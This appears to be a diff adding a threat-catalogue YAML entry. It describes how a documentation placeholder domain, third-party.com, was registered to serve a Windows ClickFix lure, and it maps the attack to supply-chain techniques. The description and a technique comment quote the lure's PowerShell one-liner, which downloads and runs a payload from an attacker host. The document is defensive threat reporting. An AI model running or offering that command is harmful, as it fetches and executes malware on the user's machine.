@@ -1,0 +1,83 @@
+id: AS289
+type: Attack Story
+date: 2026-09
+platforms:
+  - cdn
+  - ai-agents
+  - windows
+
+summary: Placeholder domain third-party.com turned live ClickFix server
+description: |
+  Manifold Security found that third-party[.]com — a documentation
+  placeholder embedded in 1,500+ files across 1,700+ repositories
+  (Chromium developer docs, Sanity and Vercel skills, MCP-server docs) —
+  is not IANA-reserved like example.com, and someone registered it. Since
+  at least June 2026 it has served a Windows-gated ClickFix lure: a fake
+  Cloudflare verification page poisons the clipboard and walks the user
+  through Win+R / Ctrl+V / Enter into a PowerShell one-liner
+  (irm elxxvvx[.]xyz/f | iex) with a decoy captcha comment appended.
+  macOS/Linux user-agents get a benign decoy, so scanners and
+  reputation feeds see nothing wrong; the IPFire blocklist listed it on
+  7 July and de-listed it on 17 July for exactly that reason. Nobody's
+  file changed — the static string silently started resolving to attacker
+  infrastructure. Manifold reported the domain to Network Solutions
+  before publishing; the lure was still live at publication. A follow-up
+  (24 September) found placeholder ads on parking pages such as
+  your-domain[.]com and yoursite[.]com serving macOS scareware and
+  counterfeit BBC/ZDF investment-fraud pages, with every static check
+  clearing them.
+
+attacks:
+  - attack: Trusted documentation placeholders resolve to attacker infra
+    index: 1
+    stage: supply-chain
+    customer: 0
+    supplier: 2
+    techniques:
+      - techniqueID: T0102
+        techName: Discover used open-source dependencies
+        tactic: Reconnaissance
+        comment: |
+          The placeholder sat in skills, MCP-server docs, and repos of
+          trusted names; the same public-code-search path maps every
+          installable dependency an agent may follow.
+      - techniqueID: T0205
+        techName: Compromise third-party CDN or hosted web asset
+        tactic: Initial Access
+        comment: |
+          Registering the domain took over a hosted web asset thousands of
+          files already pointed at — no dependency change on anyone's side.
+      - techniqueID: T0121
+        techName: Compromised legitimate artifact
+        tactic: Resource Development
+        comment: |
+          The familiar placeholder kept its name and its consumers while
+          what it served changed hands.
+  - attack: Windows visitors executing the ClickFix lure
+    index: 2
+    stage: post-supply-chain
+    customer: 1
+    supplier: 0
+    techniques:
+      - techniqueID: T0159
+        techName: Malicious artifact execution
+        tactic: Execution
+        comment: |
+          The pasted PowerShell one-liner fetches and runs the
+          second-stage payload in memory (irm elxxvvx[.]xyz/f | iex).
+      - techniqueID: T0153
+        techName: Compromised developer workstation
+        tactic: Initial Access
+        comment: |
+          The lure targets Windows developer machines; a domain-joined,
+          logged-in workstation is the intended landing point.
+
+gaps:
+  - ClickFix / clipboard-poisoning social engineering is not a first-class
+    OSC&R technique; the human-run command is approximated by T0159/T0153.
+  - A documentation placeholder as a dependency-trust input (resolved at
+    request time) has no dedicated technique beyond T0205.
+
+links:
+  - https://www.manifold.security/blog/third-party-com-placeholder-clickfix
+  - https://www.manifold.security/blog/placeholder-domains-ads-serve-scams
